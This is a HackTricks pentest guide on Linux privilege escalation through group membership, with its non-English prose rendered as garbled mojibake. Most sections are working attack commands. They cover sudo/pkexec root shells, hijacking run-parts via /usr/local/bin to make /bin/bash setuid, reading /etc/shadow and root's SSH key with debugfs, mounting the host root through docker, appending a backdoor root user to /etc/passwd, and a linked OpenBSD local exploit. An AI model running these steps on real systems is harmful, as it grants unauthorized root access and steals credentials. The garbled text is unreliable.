# рджрд┐рд▓рдЪрд╕реНрдк рд╕рдореВрд╣ - рд▓рд┐рдирдХреНрд╕ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЗрд╕реНрдХреЗрд▓реЗрд╢рди

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## рд╕реБрдбреЛ/рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рдореВрд╣

### **рдкреАрдИ - рд╡рд┐рдзрд┐ 1**

**рдХрднреА-рдХрднреА**, **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ (рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ)** **/etc/sudoers** рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдЗрди рдкрдВрдХреНрддрд┐рдпреЛрдВ рдореЗрдВ рд╕реЗ рдХреБрдЫ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛ рд╕реВрдбреЛ рдпрд╛ рдПрдбрдорд┐рди рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ, рд╡рд╣ рд╕реВрдбреЛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреБрдЫ рднреА рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ **рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```
sudo su
```
### PE - рд╡рд┐рдзрд┐ 2

рд╕рднреА suid рдмрд╛рдЗрдирд░реА рдЦреЛрдЬреЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдмрд╛рдЗрдирд░реА **Pkexec** рд╣реИ:
```bash
find / -perm -4000 2>/dev/null
```
рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдмрд╛рдЗрдирд░реА **pkexec рдПрдХ SUID рдмрд╛рдЗрдирд░реА рд╣реИ** рдФрд░ рдЖрдк **sudo** рдпрд╛ **admin** рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рддреЛ рдЖрдк `pkexec` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдЗрдирд░реА рдХреЛ рд╕реБрдбреЛ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдо рддреМрд░ рдкрд░ рдпреЗ рд╕рдореВрд╣ **polkit рдиреАрддрд┐** рдХреЗ рдЕрдВрджрд░ рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рдиреАрддрд┐ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдкрд╣рдЪрд╛рдирддреА рд╣реИ рдХрд┐ рдХреМрди-рдХреМрди рд╕реЗ рд╕рдореВрд╣ `pkexec` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдЬрд╛рдВрдЪреЗрдВ:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
рд╡рд╣рд╛рдВ рдЖрдкрдХреЛ рдорд┐рд▓реЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕реЗ рд╕рдореВрд╣реЛрдВ рдХреЛ **pkexec** рдФрд░ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рдореЗрдВ рдХреБрдЫ рд▓рд┐рдирдХреНрд╕ рдбрд┐рд╕реНрдЯреНрд░реЛ рдореЗрдВ рд╕рдореВрд╣ **sudo** рдФрд░ **admin** рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

**рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
рдпрджрд┐ рдЖрдк **pkexec** рдХреЛ execute рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**рдпрд╣ рдЗрд╕рд▓рд┐рдП рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВ, рдмрд▓реНрдХрд┐ рдЗрд╕рд▓рд┐рдП рдХрд┐ рдЖрдк GUI рдХреЗ рдмрд┐рдирд╛ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рд╣реИрдВ**ред рдФрд░ рдЗрд╕ рдореБрджреНрджреЗ рдХрд╛ рдПрдХ рдХрд╛рдо рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдпрд╣рд╛рдБ рд╣реИ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)ред рдЖрдкрдХреЛ **2 рдЕрд▓рдЧ-рдЕрд▓рдЧ ssh рд╕рддреНрд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## рд╡реНрд╣реАрд▓ рд╕рдореВрд╣

**рдХрднреА-рдХрднреА**, **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ **/etc/sudoers** рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдпрд╣ рдкрдВрдХреНрддрд┐ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```
%wheel	ALL=(ALL:ALL) ALL
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛ рд╕рдореВрд╣ wheel рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ, рд╡рд╣ рд╕реБрдбреЛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреБрдЫ рднреА рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ **рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```
sudo su
```
## рд╢реИрдбреЛ рдЧреНрд░реБрдк

**рд╢реИрдбреЛ рдЧреНрд░реБрдк** рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **/etc/shadow** рдлрд╝рд╛рдЗрд▓ **рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВ:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ рдФрд░ рдХреБрдЫ рд╣реИрд╢ **рдХреНрд░реИрдХ** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

## рдХрд░реНрдордЪрд╛рд░реА рд╕рдореВрд╣

**staff**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдмрд┐рдирд╛ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рд╕рд╛рде рд╕рд┐рд╕реНрдЯрдо (`/usr/local`) рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рд╕рдВрд╢реЛрдзрди рдЬреЛрдбрд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ `/usr/local/bin` рдореЗрдВ рдирд┐рд░реНрд╡рд╛рдЪрдиреАрдп рд╣реИрдВ, рдФрд░ рд╡реЗ "/bin" рдФрд░ "/usr/bin" рдореЗрдВ рдЙрд╕реА рдирд╛рдо рдХреЗ рдирд┐рд░реНрд╡рд╛рдЪрдиреАрдп рдХреЛ "рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ" рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред рдЬрд┐рд╕рдХрд╛ рд╕рдВрдмрдВрдз рдЕрдзрд┐рдХ рд╕реЗ рдЕрдзрд┐рдХ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ/рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗ рд╣реИред [\[рд╕реНрд░реЛрдд\]](https://wiki.debian.org/SystemGroups)

рдбреЗрдмрд┐рдпрди рд╡рд┐рддрд░рдгреЛрдВ рдореЗрдВ, `$PATH` рдЪрд░ рдорд╛рди рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ `/usr/local/` рд╕рдмрд╕реЗ рдЙрдЪреНрдЪ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЪрд╛рд╣реЗ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛрдВ рдпрд╛ рди рд╣реЛрдВред
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
рдпрджрд┐ рд╣рдо `/usr/local` рдореЗрдВ рдХреБрдЫ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдЖрд╕рд╛рдиреА рд╕реЗ рд░реВрдЯ рдЕрдХрд╛рдЙрдВрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

`run-parts` рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдирд╛ рд░реВрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЕрдзрд┐рдХрд╛рдВрд╢ рдХрд╛рд░реНрдпрдХреНрд░рдо `run-parts` рдХреА рддрд░рд╣ рдЪрд▓рд╛рдП рдЬрд╛рдПрдВрдЧреЗ (рдХреНрд░реЙрдирдЯреИрдм, рдЬрдм рдПрд╕рдПрд╕рдПрдЪ рд▓реЙрдЧрд┐рди рд╣реЛ)ред
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
рдпрд╛ рдЬрдм рдПрдХ рдирдИ ssh рд╕рддреНрд░ рд▓реЙрдЧрд┐рди рд╣реЛред
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**рд╢рд╛рд░реАрд░рд┐рдХ рдпрд╛ рджрд╛рдЦрд┐рд▓реЗ рдХрд░рдиреЗ рдХреА рдХреНрд░рд┐рдпрд╛**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## рдбрд┐рд╕реНрдХ рд╕рдореВрд╣

рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд▓рдЧрднрдЧ **рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рдорд╛рди** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдлрд╝рд╛рдЗрд▓реЗрдВ: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ debugfs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `/tmp/asd1.txt` рдХреЛ `/tmp/asd2.txt` рдореЗрдВ рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдЧрд░ рдЖрдк **рд░реВрдЯ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ (рдЬреИрд╕реЗ `/etc/shadow` рдпрд╛ `/etc/passwd`) рддреЛ рдЖрдкрдХреЛ "**рдЕрдиреБрдорддрд┐ рдирд╛рдордВрдЬреВрд░**" рддреНрд░реБрдЯрд┐ рдЖрдПрдЧреАред

## рд╡реАрдбрд┐рдпреЛ рд╕рдореВрд╣

`w` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХреМрди рд▓реЙрдЧ рдЗрди рд╣реИ** рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рджрд┐рдЦрд╛рдПрдЧрд╛:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **yossi рд╢рд╛рд░реАрд░рд┐рдХ рд░реВрдк рд╕реЗ** рдорд╢реАрди рдкрд░ рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рдореЗрдВ рд▓реЙрдЧ рдЗрди рд╣реИрдВред

**рд╡реАрдбрд┐рдпреЛ рд╕рдореВрд╣** рдХреЛ рд╕реНрдХреНрд░реАрди рдЖрдЙрдЯрдкреБрдЯ рджреЗрдЦрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ рдЖрдк рд╕реНрдХреНрд░реАрди рдХреА рд╡рд░реНрддрдорд╛рди рдЫрд╡рд┐ рдХреЛ рд░реЙ рдбреЗрдЯрд╛ рдореЗрдВ рдкрдХрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╕реНрдХреНрд░реАрди рдХреМрди рд╕реА рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИред рд╕реНрдХреНрд░реАрди рдбреЗрдЯрд╛ рдХреЛ `/dev/fb0` рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЖрдк рдЗрд╕ рд╕реНрдХреНрд░реАрди рдХреА рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдХреЛ `/sys/class/graphics/fb0/virtual_size` рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**рдЦреЛрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП **рд░реЙ рдЗрдореЗрдЬ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЖрдк **GIMP** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **`screen.raw`** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ **рд░реЙ рдЗрдореЗрдЬ рдбреЗрдЯрд╛** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ:

![](<../../../.gitbook/assets/image (463).png>)

рдлрд┐рд░ рдЪреМрдбрд╝рд╛рдИ рдФрд░ рдКрдЪрд╛рдИ рдХреЛ рд╕реНрдХреНрд░реАрди рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╡рд╛рд▓реЗ рдХреЛ рдмрджрд▓реЗрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдЫрд╡рд┐ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рдФрд░ рдЙрд╕реЗ рдЪреБрдиреЗрдВ рдЬреЛ рд╕реНрдХреНрд░реАрди рдХреЛ рдмреЗрд╣рддрд░ рджрд┐рдЦрд╛рддрд╛ рд╣реИ):

![](<../../../.gitbook/assets/image (317).png>)

## рд░реВрдЯ рд╕рдореВрд╣

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдХреЛ рдХреБрдЫ **рд╕реЗрд╡рд╛** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реНрд╕ рдпрд╛ рдХреБрдЫ **рд▓рд╛рдЗрдмреНрд░реЗрд░реА** рдлрд╝рд╛рдЗрд▓реНрд╕ рдпрд╛ **рдЕрдиреНрдп рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ** рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд░реНрдЪрд╕реНрд╡ рдЙрдиреНрдирддрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ...

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рд░реВрдЯ рд╕рджрд╕реНрдп рдХреМрди-рдХреМрди рд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## рдбреЙрдХрд░ рд╕рдореВрд╣

рдЖрдк **рдореЗрдЬрд╝рдмрд╛рди рдорд╢реАрди рдХреЗ рд░реВрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд╡реЙрд▓реНрдпреВрдо рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдЬрдм рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рддреБрд░рдВрдд рдЙрд╕ рд╡реЙрд▓реНрдпреВрдо рдореЗрдВ `chroot` рд▓реЛрдб рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЖрдкрдХреЛ рдорд╢реАрди рдкрд░ рд░реВрдЯ рджреЗрддрд╛ рд╣реИред
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## lxc/lxd рд╕рдореВрд╣

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm рд╕рдореВрд╣

рд╕рд╛рдорд╛рдиреНрдпрддрдГ **рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп** рдХреЛ **`adm`** рдХреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ **/var/log/_** рдореЗрдВ рд╕реНрдерд┐рдд рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдПред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХрд░ рдЪреБрдХреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ **рд▓реЙрдЧреНрд╕ рдХреА рдУрд░ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдП**ред

## Auth рд╕рдореВрд╣

OpenBSD рдХреЗ рдЕрдВрджрд░ **auth** рд╕рдореВрд╣ рдЖрдо рддреМрд░ рдкрд░ рдпрджрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рддреЛ рдлрд╝реЛрд▓реНрдбрд░ _**/etc/skey**_ рдФрд░ _**/var/db/yubikey**_ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
